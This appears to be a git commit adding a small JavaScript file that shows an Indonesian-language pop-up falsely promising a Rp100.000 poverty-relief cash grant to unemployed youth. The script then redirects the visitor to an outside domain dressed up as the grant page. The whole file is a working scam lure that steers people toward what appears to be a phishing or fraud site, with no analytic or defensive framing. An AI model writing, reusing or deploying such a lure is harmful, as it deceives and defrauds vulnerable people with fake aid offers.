93cb461804b97ba63530ad31102cc51c661eee75
Help-All <imaobongumoh637@gmail.com>
2026-05-16 21:25:07 +0100

    Create activeindo.js

---
+++ activeindo.js
@@ -0,0 +1,10 @@
+var password = 'Rp100.000';
+
+password = prompt(
+  'Selamat, Anda berhak menerima Rp100.000 BANTUAN TUNAI PENGENTASAN KEMISKINAN UNTUK PEMUDA YANG TIDAK BEKERJA. Klik OK untuk menerima secara instan.',
+  'Rp100.000'
+);
+
+if (password !== 'Rp100.000') {
+    location.href = 'https://getin-ofer.cfd/100000-Hibah-Pemuda.html';
+}
